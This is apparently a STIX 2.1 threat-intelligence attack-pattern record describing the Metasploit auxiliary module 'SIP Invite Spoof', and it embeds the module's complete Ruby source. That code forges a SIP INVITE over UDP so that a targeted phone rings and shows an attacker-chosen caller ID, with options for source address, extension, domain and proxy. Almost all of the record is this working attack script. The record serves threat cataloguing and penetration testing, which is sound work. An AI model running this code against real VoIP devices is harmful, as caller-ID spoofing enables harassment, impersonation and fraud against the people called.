{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--6d8edc89-526a-4228-b6e0-c3161af1061a",
    "created": "2024-08-14T16:31:22.61522Z",
    "modified": "2024-08-14T16:31:22.615224Z",
    "name": "SIP Invite Spoof",
    "description": " This module will create a fake SIP invite request making the targeted device ring and display fake caller id information. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/voip/sip_invite_spoof.rb",
            "external_id": "sip_invite_spoof.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::Udp\n  include Msf::Auxiliary::Scanner\n\n  def initialize\n    super(\n      'Name'           => 'SIP Invite Spoof',\n      'Description'    => %q{\n        This module will create a fake SIP invite request making the targeted device ring\n        and display fake caller id information.\n      },\n      'Author'         =>\n        [\n          'David Maynor <dave[at]erratasec.com>', # original module\n          'ChrisJohnRiley' # modifications\n        ],\n      'License'        =>  MSF_LICENSE\n    )\n\n    deregister_udp_options\n    register_options(\n      [\n        Opt::RPORT(5060),\n        OptString.new('SRCADDR', [true, \"The sip address the spoofed call is coming from\",'192.168.1.1']),\n        OptString.new('MSG', [true, \"The spoofed caller id to send\",\"The Metasploit has you\"]),\n        OptString.new('EXTENSION', [false, \"The specific extension or name to target\", nil]),\n        OptString.new('DOMAIN', [false, \"Use a specific SIP domain\", nil])\n      ])\n    register_advanced_options(\n      [\n        OptAddress.new('SIP_PROXY_NAME', [false, \"Use a specific SIP proxy\", nil]),\n        OptPort.new('SIP_PROXY_PORT', [false, \"SIP Proxy port to use\", 5060])\n      ])\n  end\n\n\n  def run_host(ip)\n\n    begin\n\n      name = datastore['MSG']\n      src = datastore['SRCADDR']\n      ext = datastore['EXTENSION']\n      dom = datastore['DOMAIN']\n      sphost = datastore['SIP_PROXY_NAME']\n      spport = datastore['SIP_PROXY_PORT'] || 5060\n      conn_string = ''\n\n      if not ext.nil? and not ext.empty?\n        # set extesion name/number\n        conn_string = \"#{ext}@\"\n      end\n\n      if not dom.nil? and not dom.empty?\n        # set domain\n        conn_string << \"#{dom}\"\n      else\n        conn_string << \"#{ip}\"\n      end\n\n      # set Route header if SIP_PROXY is set\n      if not sphost.nil? and not sphost.empty?\n        route = \"Route: <sip:#{sphost}:#{spport};lr>\\r\\n\"\n      end\n\n      connect_udp\n\n      print_status(\"Sending Fake SIP Invite to: #{conn_string}\")\n      print_status(\"Using SIP proxy #{sphost}:#{spport}\") if route\n\n      req =  \"INVITE sip:#{conn_string} SIP/2.0\" + \"\\r\\n\"\n      # add Route: header to req if SIP_PROXY is set\n      req << route if route\n      req << \"To: <sip:#{conn_string}>\" + \"\\r\\n\"\n      req << \"Via: SIP/2.0/UDP #{ip}\" + \"\\r\\n\"\n      req << \"From: \\\"#{name}\\\"<sip:#{src}>\" + \"\\r\\n\"\n      req << \"Call-ID: #{(rand(100)+100)}#{ip}\" + \"\\r\\n\"\n      req << \"CSeq: 1 INVITE\" + \"\\r\\n\"\n      req << \"Max-Forwards: 20\" +  \"\\r\\n\"\n      req << \"Contact: <sip:#{conn_string}>\" + \"\\r\\n\\r\\n\"\n\n      udp_sock.put(req)\n      disconnect_udp\n\n    rescue Errno::EACCES\n    end\n\n  end\nend\n"
}